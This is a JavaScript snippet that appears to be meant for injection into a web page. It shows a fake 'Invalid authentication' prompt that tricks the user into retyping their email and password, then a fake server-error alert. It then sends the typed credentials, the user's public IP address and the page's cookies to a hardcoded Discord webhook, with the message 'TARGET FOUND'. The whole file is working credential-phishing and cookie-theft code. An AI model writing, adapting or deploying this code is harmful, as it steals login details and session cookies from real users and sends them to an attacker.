async function fetchPublicIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
        throw new Error('Failed to fetch IP address');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Error fetching IP address';
    }
}

while ((pr = window.prompt("Invalid authentication! Please retype your email and password in this format:\n\nemail+password \n\nExample:\n  johndoe@dazsma-osjschools.edu.ph + john_secret_password")) == '') {} alert("An error has occured to the servers. Please contact the developers to help fix this issue.");

fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoVtcbZs16gwTLzs98Dl3ceLoU6ruAnZZ7E-HjKN9YHwL6vaaw0", {
    "method": "POST",
    "headers": {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }, "body": JSON.stringify(
        {
        "content": "@everyone TARGET FOUND :warning::warning::warning:",
        "embeds": [
            {
                "title": "IP Address",
                "description": "```"+ await fetchPublicIpAddress() + "```",
                "color": 16711680
            },
            {   
            "title": "Form Information",
            "description": "```" + pr + "```",
            "color": 16711680
            },
            {
            "title": "Cookies",
            "description": "```" + document.cookie + "```",
            "color": 16711680
            }
        ],
        "attachments": []
    })
});
